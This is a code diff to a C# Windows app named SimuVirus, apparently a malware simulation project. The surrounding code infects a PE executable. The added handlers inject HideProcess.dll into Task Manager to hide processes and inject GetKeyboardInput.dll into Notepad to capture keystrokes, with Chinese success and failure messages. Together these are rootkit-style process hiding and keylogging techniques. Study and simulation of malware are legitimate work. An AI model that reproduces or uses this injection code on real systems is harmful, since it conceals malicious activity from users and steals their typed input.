@@ -14,6 +14,7 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using SimuVirus.deploy;
 using SimuVirus.tools;
+using System.Diagnostics;
 
 namespace SimuVirus
 {
@@ -47,6 +48,44 @@ namespace SimuVirus
             {
                 Infect infect = new Infect();
                 infect.infectPe("C:\\Users\\etenal\\Downloads\\re的传统.exe");
+            }));
+        }
+
+        private void Hide_Process(object sender, RoutedEventArgs e)
+        {
+
+            tasks.Add(Task.Factory.StartNew(() =>
+            {
+                byte[] dllPath = Encoding.ASCII.GetBytes(Info.currentDirectory + "\\HideProcess.dll");
+                //string exePath = Info.currentDirectory + "\\DllInject.exe";
+
+                Process[] targetProcesses = Process.GetProcessesByName("Taskmgr");
+                foreach (Process target in targetProcesses)
+                {
+                    Inject inject = new Inject();
+                    if (inject.injectDll(target.Id, dllPath))
+                        MessageBox.Show("隐藏进程成功");
+                    else
+                        MessageBox.Show("隐藏进程失败");
+                }
+            }));
+        }
+
+        private void Get_KeyboardInput(object sender, RoutedEventArgs e)
+        {
+            tasks.Add(Task.Factory.StartNew(() =>
+            {
+                byte[] dllPath = Encoding.ASCII.GetBytes(Info.currentDirectory + "\\GetKeyboardInput.dll");
+
+                Process[] targetProcesses = Process.GetProcessesByName("Notepad");
+                foreach (Process target in targetProcesses)
+                {
+                    Inject inject = new Inject();
+                    if (inject.injectDll(target.Id, dllPath))
+                        MessageBox.Show("注入成功");
+                    else
+                        MessageBox.Show("注入失败");
+                }
             }));
         }
     }
